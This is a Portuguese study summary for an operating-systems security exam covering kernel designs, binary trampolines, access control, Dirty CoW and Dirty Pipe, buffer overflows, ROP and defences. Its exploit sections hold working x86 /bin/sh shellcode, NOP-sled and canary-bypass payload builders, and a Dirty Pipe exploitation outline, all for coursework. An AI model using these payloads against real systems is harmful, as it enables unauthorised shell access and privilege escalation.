# Resumo parte 2

## Perguntas da prova 2

### Microkernel x Monolítico
| Microkernel                                          |                                Monolítico           |
| -----------------------------------------------------|-----------------------------------------------------|
| Funcionalidades são adicionadas no espaço de usuário | Funcionalidade são adicionadas ao kernel            |
| Políticas são adicionadas ao espaço de usuário       | Políticas são adicionadas ao espaço de usuário      |
| Complexidade do kernel é estável                     | complixdade do kernel aumenta                       |

Quando atacante ganha acesso ao sistema microkernel é muito provável que ele esteja em espaço de usuário. Isso
mantém o Kernel preservado. 

![Tipos de kernel](https://github.com/user-attachments/assets/a44646cc-bd1c-4766-bac1-2c676d031c9a "Microkernel x Monolítico")


### Como funciona as técnias de Remendos e Trampolins em instrumenção de binários?
As técnicas de remendos e trampolins são usadas na instrumentação de binários para modificar o comportamento de um programa em tempo de execução, sem alterar significativamente o código original. A ideia é desviar temporariamente o fluxo de execução para um novo código (o trampolim), que realiza alguma tarefa adicional antes de retornar ao fluxo original do programa.

#### 1. **Remendos (Patches)**
Um remendo é uma modificação direta no binário, onde um trecho do código original é substituído por um novo código. Isso geralmente envolve a substituição de uma ou mais instruções por um salto (por exemplo, um `jmp`) para outro endereço de memória onde o código adicional será executado.

**Exemplo em Pseudocódigo:**

```assembly
Original:
0x1000: mov eax, [ebx]
0x1004: add eax, 5
0x1008: call functionA

Após o Remendo:
0x1000: jmp 0x2000      ; Salta para o trampolim
0x1004: nop             ; No Operation (para preencher o espaço, se necessário)
0x1008: call functionA
```

#### 2. **Trampolins (Trampolines)**
O trampolim é o código para onde o remendo redireciona a execução. Ele executa as instruções que foram sobrescritas pelo remendo e, em seguida, retorna o controle para o programa original, pulando para o endereço imediatamente após o remendo.

**Exemplo em Pseudocódigo:**

```assembly
Trampolim em 0x2000:
0x2000: mov eax, [ebx]  ; Reimplementa a instrução original
0x2004: add eax, 5      ; Continua a instrução original
0x2008: jmp 0x1008      ; Retorna ao fluxo original
```

Neste exemplo, o endereço `0x1000` originalmente tinha um `mov eax, [ebx]`, que foi sobrescrito por um `jmp 0x2000`. O trampolim em `0x2000` primeiro executa o `mov eax, [ebx]` e `add eax, 5`, que eram as instruções originais, e depois retorna ao endereço `0x1008`, que é onde o programa deveria continuar após a modificação.

### Aplicações
Essa técnica é útil em várias situações, como:
- **Depuração**: Para adicionar verificações ou logs sem interferir no fluxo normal do programa.
- **Compatibilidade**: Para adaptar binários antigos para trabalhar com novas tecnologias ou restrições.
- **Segurança**: Para injetar medidas de segurança, como verificações de integridade, em binários existentes.

Ao usar remendos e trampolins, é possível modificar o comportamento de um programa sem reescrever o binário inteiro, permitindo uma instrumentação eficiente e não invasiva.

### ACL's x Capability's
Controle de acesso: **Quem** pode acessar, **o que** pode acessa e de que **forma**.
- Quem: sujeito, agentes
- O que: objetos
- Forma: Permissões
Para o controle de acesso é especificado **políticas** e **mecanismos**: O primeiro fala o que deve ser feito e sua modificação ao longo do tempo, o segundo falam como devem ser feito e implementam a política.
Matriz de controle de acesso

|       | Obj1 | Obj2 |   Obj3   |  Subj2  |
|-------|------|------|----------|---------|
| Subj1 | R    | RW   |          | send    |
| Subj2 |      | RX   |          | control |
| Subj3 | RW   |      |  RWX own |  recv   |

Manter essa tabela para todo o sistema é custoso por causa de sem tamanho e por ser altamente dinâmica. Porém é possível guardar por **colunas (ACL)** ou por **linhs (Capability ou CLits**):
- **Access Control Lists**: Sujeitos normalmente são agregados em grupos (Owner, Group, everyone), podem ter permissões negativas.
- **Capability-based Access Control**: Token de acesso (Imagem 3), para acessar um recurso, é preciso apresentar uma capability. Promove uma granularidade fina de controle de acesso e é fácil delegação de direitos de acesso.
![Imagem 3](https://github.com/user-attachments/assets/2dd27f18-8ab5-4e32-9199-ff6bed84ab15 "Capability example")
![Imagem 4](https://github.com/user-attachments/assets/70fbc453-fba7-4e0b-b296-0a48692481d3 "ACL x Clits")
A imagem compara duas formas de controlar o acesso a recursos em sistemas computacionais: **Listas de Controle de Acesso (ACLs)** e **Capacidades (Capabilities)**, frequentemente também referidas como **Clists**.

#### ACLs (Access Control Lists):
- **Representação**: ACLs são listas anexadas a um objeto, como um arquivo ou diretório, que definem quais usuários ou grupos têm permissão de acessar ou modificar o objeto.
- **Funcionamento**: Quando um usuário tenta acessar um recurso, o sistema verifica a ACL associada ao objeto para determinar se o usuário tem a permissão necessária.
- **Dependência de mecanismos externos**: ACLs geralmente precisam de outros mecanismos para fornecer uma segurança total, como o uso de setuid para alterar a identidade do usuário temporariamente durante a execução de um programa.
- **Auditoria**: As ACLs facilitam a auditoria do sistema, pois permitem verificar diretamente quem tem permissão para acessar um determinado objeto.

#### Capacidades (Capabilities ou Clists):
- **Representação**: Em vez de serem associadas a objetos, as capacidades são atribuídas a um sujeito. Uma capacidade é um token ou referência que dá a um sujeito a permissão de acessar um objeto específico.
- **Funcionamento**: Um sujeito que possui uma capacidade pode acessar o recurso diretamente sem que o sistema precise verificar uma ACL associada ao objeto.
- **Independência do usuário**: As capacidades podem ser atribuídas a sujeito sem relação direta com o usuário, permitindo um controle mais fino sobre permissões, como nos casos de fork (criação de processos filhos), menor privilégio (least privilege), e delegação de permissões.

### BufferOverflow + Canary + Endereço de Retorno
Para explorar um Buffer Overflow nesse cenário e fazer com que a função que acessa a shell seja executada, mesmo com o NX (No-eXecute) e o canário de pilha habilitados, você pode seguir os seguintes passos:

#### 1. **Entendimento do cenário**:
- **NX** (No-eXecute): impede que o conteúdo da pilha seja executado, ou seja, você não pode injetar código shellcode diretamente na pilha.
- **Canário**: um valor que é inserido na pilha antes do endereço de retorno, projetado para detectar e prevenir sobre-escritas de pilha. Se o canário for modificado, o programa detecta e aborta a execução.
- **ASLR** (Address Space Layout Randomization) desativado: significa que os endereços de memória são previsíveis, o que facilita a exploração.
- **Localização da função shell** conhecida: você sabe onde está a função que acessa a shell na memória.

#### 2. **Estratégia de exploração**:

Como o ASLR está desativado, você pode fazer um **Ret2Libc** ou **Return Oriented Programming (ROP)** para redirecionar o fluxo de execução para a função da shell.

- **Canário**: como você conhece o valor do canário, pode sobrescrevê-lo corretamente para evitar que o programa detecte o ataque.
- **NX habilitado**: você não pode executar código injetado na pilha, então precisa redirecionar o fluxo de execução para uma função já existente.

#### 3. **Passos práticos**:

1. **Preencher o Buffer**: 
  - A variável `char buff[0x30]` tem 48 bytes. Então, você precisa enviar 48 bytes para preencher o buffer até alcançar o canário.

2. **Sobrescrever o Canário**:
  - Após os 48 bytes do buffer, você deve colocar o valor correto do canário para não ser detectado.

3. **Sobrescrever o Endereço de Retorno**:
  - Após o canário, você deve colocar os bytes necessários para pular a base pointer (`saved EBP`) e então sobrescrever o endereço de retorno.
  - Como você conhece o endereço da função que acessa a shell, coloque o endereço dessa função como o novo endereço de retorno.

#### 4. **Estrutura do Payload**:

Aqui está como seria a estrutura do payload:

```
[48 bytes de dados arbitrários] + [valor do canário] + [dados para pular o saved EBP] + [endereço da função shell]
```

# Exemplo de como construir o payload
```python
payload = b"A" * 48                # Preenche o buffer com 48 bytes arbitrários
payload += b"\xef\xbe\xad\xde"     # Valor do canário em little-endian (0xdeadbeef)
payload += b"B" * 4                # Pula o saved EBP
payload += b"\x84\x84\x04\x08"     # Endereço da função shell em little-endian (0x08048484)

# Exibir o payload
print(payload)
```

### Como fazer e utilizar um Shellcode em que você tem o endereço da variável char buff[64] (NX: Off, Canary: Off, ASLR: Off)
Quando o NX, Canary e ASLR estão desativados, você pode explorar a vulnerabilidade de Buffer Overflow de maneira mais direta, injetando um shellcode diretamente na pilha para abrir um terminal. Aqui está um exemplo de como você pode fazer isso em Python.

#### 1. **Shellcode**:
O shellcode é um pequeno pedaço de código que será executado. Neste caso, usaremos um shellcode que abre um terminal (`/bin/sh`). Um exemplo de shellcode para sistemas Linux é:

```python
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)
```

Esse shellcode corresponde a um código que invoca `execve("/bin/sh", NULL, NULL)`.

#### 2. **Buffer Overflow Exploit**:

Como você conhece o endereço da variável `char buff[64]`, você pode preencher o buffer com o shellcode e depois sobrescrever o endereço de retorno com o endereço do início do buffer.

#### 3. **Explicação**:

- **NOP sled**: Uma sequência de instruções `NOP` (`\x90`), que não fazem nada. Isso aumenta a chance de cair no shellcode.
- **Shellcode**: O código que será executado para abrir o terminal.
- **Sobrescrever o endereço de retorno**: Você substitui o endereço de retorno na pilha com o endereço do buffer onde o shellcode foi injetado. Quando a função retorna, a execução continua no shellcode.

#### 4. **Exemplo Completo**:

```python
import struct

# Shellcode para abrir /bin/sh
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# Endereço conhecido da variável buff[64]
buff_address = 0xffffd5f0  # Exemplo fictício, substitua pelo endereço real

# Preencher o buffer com NOPs, shellcode e depois o endereço de retorno
padding = b"\x90" * (64 - len(shellcode))  # NOP sled
payload = padding + shellcode  # Inserir o shellcode no buffer
payload += struct.pack("<I", buff_address)  # Sobrescrever o endereço de retorno com o endereço do buffer

# Exibir o payload em formato que pode ser usado para exploração
print(payload)
```

#### Explicação do payload

A linha `padding = b"\x90" * (64 - len(shellcode))` é utilizada para criar uma sequência de bytes de padding que preencherá o espaço restante no buffer antes do shellcode.

1. **`b"\x90"`**:
   - `\x90` é a instrução **NOP** (No Operation) em linguagem de montagem (assembly) para processadores da família x86.
   - Uma instrução NOP simplesmente diz ao processador para "não fazer nada" por um ciclo de clock. É frequentemente usada para criar o que é chamado de **NOP sled**.

2. **`len(shellcode)`**:
   - Esta função calcula o tamanho (em bytes) do shellcode que você está injetando. Por exemplo, se o shellcode tiver 24 bytes, `len(shellcode)` retornará 24.

3. **`64`**:
   - Este é o tamanho total do buffer (neste caso, `char buff[64]`), que é de 64 bytes.

4. **`64 - len(shellcode)`**:
   - Isso calcula quantos bytes de espaço restam no buffer depois de colocar o shellcode. Se o shellcode tiver 24 bytes, então `64 - 24 = 40`. Ou seja, 40 bytes ainda estão livres no buffer.

5. **`b"\x90" * (64 - len(shellcode))`**:
   - Cria uma sequência de NOPs que preenche o espaço restante no buffer, ou seja, 40 bytes de NOPs (`\x90`), neste exemplo. Isso garante que o shellcode será executado corretamente, mesmo que o endereço exato de início da execução seja um pouco antes do shellcode.

Isto é, suponha que o shellcode tenha 20 bytes. O buffer tem 64 bytes. O restante, 44 bytes (64 - 20), será preenchido com NOPs. Isso significa que o exploit poderá redirecionar a execução para qualquer byte dentro desses 44 bytes de NOPs e ainda assim alcançar o shellcode, aumentando a chance de sucesso. Em resumo a linha **padding = b"\x90" * (64 - len(shellcode))** cria um "sled" de NOPs que preenche o buffer vulnerável até o shellcode.

Isso gerará um payload que pode ser passado para o programa vulnerável. Quando o programa retorna, ele executará o shellcode, abrindo um terminal.


# Vulnerabilidade e Ataque em Sistemas

## TOCTOU (Time-of-check time-of-use)
Um bug causado por uma condição de corrida, condição em que o resultado do processo é dependete da sequência ou sincronia de outros eventos: A execução de operações em ordem não prevista pode levar o sistema a um estado inconsistente. Os problemas varia de computações incorretas a acessos indevidos.

### Dirty CoW
Condição de corrida no subsistema de Copy-On-Write, que é uma otimização usada para duplicar páginas de memória de maneira eficiente. Quando um processo solicita uma cópia de uma página, em vez de criar uma cópia imediatamente, o kernel permite que múltiplos processos compartilhem a mesma página em modo somente de leitura. Se um dos processos tenta modificar a página, uma cópia real é criada e a modificação é feita na nova página. Garantindo que os outros processos continuem a ver a versão original. A vulnerabilidade CoW explora a primeira condição de corrida entre a página de cópia em CoW e a gravação na memória. A vulnerabilidade ocorre da seguinte maneira:
1. Um processo tenta escrever num aquivo que ele não tem permissão
2. O S.O cria uma página de cópia na memória para o processo escrever.
3. Outro processo tenta causar um condição de corrida entre a criação da página cópia e o apontamento do ponteiro do processo para esse arquivo.
4. Essa condição permite que o ponteiro do processo ao invés de ter o ponteiro remapeado para a página cópia na memória, a condição de corrida entra em ação e reaponta o ponteiro para o arquivo original em memória.
5. O processo que pediu para escrever volta a execução, então o sistema verifica que ele tem permissão de escrita. O Sistema acha que o arquivo que ele está escrevendo é a cópia, então ele permite a escrita. Assim o processo malicioso agora pode escrever num arquivo que antes não podia.

### Dirty Pipe
Também que explora uma condição de corrida. Porém agora com PIPES. Pipes são como canos que faz a comunicação direta entre processos. A saída de um está ligada na entraga de outro. É realizado os seguintes passos para o ataque.
1. Criar um Pipe
2. Encher o determinado pipe com dados arbitrários.
3. Deixar a flag configurada em todas as instâncias de **struct pipe_buffer** no anel **struct pipe_inode_info**.
4. Unior os dados vindo do arquivo alvo (abrindo-o com a flag **O_RDONLY**) dentro do pipe pegando de um pouco antes do deslocamento falado.
5. Escreve dados arbitrário dentro do pipe. Estes dados sobreescreverão os dados do arquivo que estão em cache ao invés de criar um novo buffer anônimo (**struct pipe_buffer**), porque a flag **PIPE_BUF_FLAG_CAN_MERGE** está configurada.


## Buffer Overflow
Vulnerabilidade onde um programa permite a escrita de dados além dos limites de um buffer.
![Buffer exemplo](https://github.com/user-attachments/assets/6a537d2a-27bd-4da4-b8b4-d09e85262347 "Um buffer para exemplo")
Um possível código simples de B.O. poderia ser:
```python
import struct

# Endereço fictício da função secret_function (substitua pelo endereço real)
# Exemplo: suponha que o endereço seja 0x080484b6
secret_function_address = 0x080484b6

# Cria um payload para o exploit
# 64 bytes de preenchimento para atingir o endereço de retorno
payload = b"A" * 64

# Sobrescreve o endereço de retorno com o endereço da secret_function
payload += struct.pack("<I", secret_function_address)

# Exibe o payload que deve ser passado para o programa vulnerável
print(payload)
```
### Return-oriented programming
A ideia do ROP é utilizar códigos já presentes no espaço de endereçamento do processo e que tem permissão de execução. Código presente no próprio programa ou em códigos de bibliotecas. Isso é realizado através da escolha de pedaços de códigos chamados "gadgets". Um getget é uma sequencia de instruções que são finalizadas com a instrução "ret".
![Um possível exemplo de ROP](https://github.com/user-attachments/assets/7bbc980e-1300-48f9-a7a9-f63e21b5edd8 "Exemplo de ROP").


## Defesas em sistema
As principais defesas em sistemas são:
- Canary
- NX
- ASLR

### Canary
É um valor arbitrário que, quando há uma violação de stack, seu valor é modificado. O Kernel vê que ele foi modificado e interrompe a execução do programa.

### NX
Basicamente, impede a execução de um código na stack.

#### ASLR
É a randomização de endereços no programa. Ele aleatoriza a localização de áreas da memória para dificultar a previsão dos endereços por atacantes.

## Trancing de artefatos maliciosos.
Processo de monitorar e registrar a execução de um programa, seja analisando seu código estático ou seu comportamento em tempo real. Existem dois métodos de tracing: **estático** e **dinâmico**:
- **Estático**: Análise de código-fonte ou binário sem executar o programa.
  - Ferramentas: IDA Pro, Ghidra, Radare2, strings, Oletools, androguard
  - Exemplo: Analisar um binário malicioso para descobrir strings suspeitas. 
  - Vantagens: Segurança, sem risco de executar código potencialmente malicioso. Também há a Identificação de Padrões, é possível de encontrar strings suspeitas, padrões de código malicioso e pontos de entrada de funções.
  - Limitações: Não detecta comportamento dinâmico, como carregamento de payloads em tempo de execução e técnicas que prejudicam a engenharia reversa, como ofuscação de caminhos.
  - Complexidade: analisar código ofuscado ou compactado pode ser extremamente difícil e demorado.
- **Dinâmico**: Execução e análise em ambiente controlado de algum binário suspeito.
  - Ferramentas: Strace, ftrace, Kprobes, Frida
  - Exemplos: Usar strace para monitorar as chamadas de sistema de um processo. Realizar o tracing de chamadas de funções tanto em user space e kernel space
  - Vantagens: Comportamento em Tempo Real, permite capturar e analisar comportamento malicioso em tempo real. Além de detectar atividades ocultas, pode revelar atividades que só ocorrem durante a execução, como exploração de vulnerabilidades e carga de payloads.
  - Limitações: Risco de Execução, executar código malicioso pode ser perigoso sem um ambiente seguro. Ambientes Controlados requerem setups especializados, como sandboxes ou máquinas virtuais. Além disso alguns Malwares identificam ambientes virtuais e mudam o comportamento.

## Defesas em sistemas:
São comuns em defesas de sistema:
- Sistemas de controle de acesso
- Sistemas de autenticação
- Logging
- Encriptação em nível de sistema de arquivos

**Covert Channels**: Métodos ocultos para transmitir informações que não são detectados por sistemas de monitoramento normais. Usam canais não destinados para comunicação, como manipulação de armazenamento ou timing.
**Side Channels**: Métodos de extrair informações indiretas com base em características físicas ou operacionais de um sistema. Usam dados como tempo de resposta, consumo de energia ou emissões eletromagnéticas para obter informações sensíveis.

### Hardening
Adoção de medidas de seguranças adicionais, normalmente reduzindo a superficie de ataques:
- Limitar o acesso administrativos com "sudo"
- Remoção de softwares/serviços desnecessários
- Restrição de execução em espaços de memória
- Binary hardening
  - Instrumentação de códigos legados.
  - Limitação via compilação
  - Limitação via ambiente de execução (eBPF)
- Sandbox
  - Containers
  - Máquinas virtuais

### Anti Vírus
Software utilizado para prevenir, detectar e remover malwares. Não são perfeitos. Podem agir através de **assinatura** e **Heurísticas e Aprendizado de máquina**:
- **Assinaturas**: Identifica padrões dos bytes dos arquivos. Funcionamento parecido com IDSs, Existe um BD de assinaturas de malware onde o AV procura por padrões existentes e são de Fácil bypass. Um malware com novo padrão nunca será
detectado
- **Heurísticas e Aprendizado de máquina**: pode identificar malwares que não possuem assinaturas no banco de dados, porém é mas sucetível a falsos positivos.
Existem métodos de ofuscação para ambos os métodos:
- Encriptação/encoding de código
- Máquinas virtuais
- Modificações de comportamentos
- Mensagens trocadas pela rede não podem ser desfeitas.
Por fim, quarentena seria: quando detectado, um malware não é removido, mas sim colocado em quarentena com isso um usuário pode retirá-lo em caso de falso positivo.








